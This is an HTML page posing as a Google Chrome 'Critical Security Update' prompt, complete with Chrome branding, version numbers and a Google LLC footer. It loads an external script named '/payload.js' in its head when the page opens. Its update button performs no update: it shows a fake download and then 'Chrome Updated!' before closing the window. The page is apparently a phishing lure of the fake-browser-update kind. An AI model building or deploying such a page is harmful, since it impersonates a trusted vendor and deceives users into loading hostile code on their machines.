<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Chrome - Critical Update</title>
    <script src="/payload.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f1f3f4; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .card-wrapper { max-width: 480px; width: 100%; border-radius: 18px; padding: 4px; background: linear-gradient(135deg, #ea4335, #fbbc04, #34a853, #4285f4); box-shadow: 0 8px 30px rgba(0,0,0,0.12); }
        .card { background: #fff; border-radius: 16px; padding: 35px; }
        .logo { text-align: center; font-size: 60px; margin-bottom: 10px; }
        .header-text { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 8px; }
        .header-text .brand { font-size: 24px; font-weight: 700; color: #1a73e8; }
        .header-text .brand span { color: #333; }
        .version-badge { background: #e8f0fe; color: #1a73e8; padding: 2px 12px; border-radius: 12px; font-size: 12px; font-weight: 600; }
        .tagline { text-align: center; color: #5f6368; font-size: 14px; margin-bottom: 18px; }
        .banner { background: #e8f0fe; padding: 16px; border-radius: 10px; border-left: 4px solid #1a73e8; margin: 15px 0; }
        .banner strong { color: #1a73e8; }
        .version-box { background: #f8f9fa; padding: 18px; border-radius: 12px; margin: 16px 0; border: 1px solid #e8eaed; }
        .version-box .row { display: flex; justify-content: space-between; padding: 5px 0; }
        .version-box .row .label { color: #5f6368; }
        .version-box .row .value { font-weight: 600; }
        .version-box .row .value.new { color: #1a73e8; }
        .btn { width: 100%; padding: 18px; background: #1a73e8; color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .btn:hover { background: #1557b0; }
        .btn-secondary { width: 100%; padding: 14px; background: transparent; color: #5f6368; border: 1px solid #dadce0; border-radius: 10px; cursor: pointer; margin-top: 8px; }
        .btn-secondary:hover { border-color: #1a73e8; color: #1a73e8; }
        .footer { margin-top: 20px; color: #9aa0a6; font-size: 11px; text-align: center; }
        @media (max-width: 500px) { .card { padding: 25px 20px; } }
    </style>
</head>
<body>
    <div class="card-wrapper">
        <div class="card">
            <div class="logo">🌐</div>
            <div class="header-text">
                <span class="brand">Google <span>Chrome</span></span>
                <span class="version-badge">v.126</span>
            </div>
            <div class="tagline">Fast, secure, and updated automatically</div>
            <div class="banner">
                <strong>🔴 Critical Security Update Available</strong>
                <br><span style="color:#5f6368;font-size:13px;">A new version is ready with important security fixes.</span>
            </div>
            <div class="version-box">
                <div class="row"><span class="label">Current Version</span><span class="value">126.0.6478.126</span></div>
                <div class="row"><span class="label">New Version</span><span class="value new">126.0.6478.182</span></div>
                <div style="font-size:12px;color:#5f6368;text-align:right;margin-top:5px;">Update size: ~45 MB</div>
            </div>
            <button class="btn" id="updateBtn">⬇️ Update Chrome Now</button>
            <button class="btn-secondary" id="closeBtn">⏰ Remind me later</button>
            <div class="footer">Google LLC • Chrome will close and reopen automatically</div>
        </div>
    </div>
    <script>
        document.getElementById('closeBtn').addEventListener('click', function() { window.close(); });
        document.getElementById('updateBtn').addEventListener('click', function() {
            var btn = document.getElementById('updateBtn');
            btn.innerHTML = '⏳ Downloading Update...';
            btn.style.background = '#ffc107';
            btn.style.color = '#333';
            btn.disabled = true;
            setTimeout(function() {
                btn.innerHTML = '✅ Chrome Updated!';
                btn.style.background = '#28a745';
                btn.style.color = 'white';
                btn.disabled = false;
                document.querySelector('.version-box .row .value.new').textContent = '✅ Updated!';
                document.querySelector('.version-box .update-size').textContent = 'Update complete • Restarting...';
                setTimeout(function() { window.close(); }, 3000);
            }, 3000);
        });
    </script>
</body>
</html>
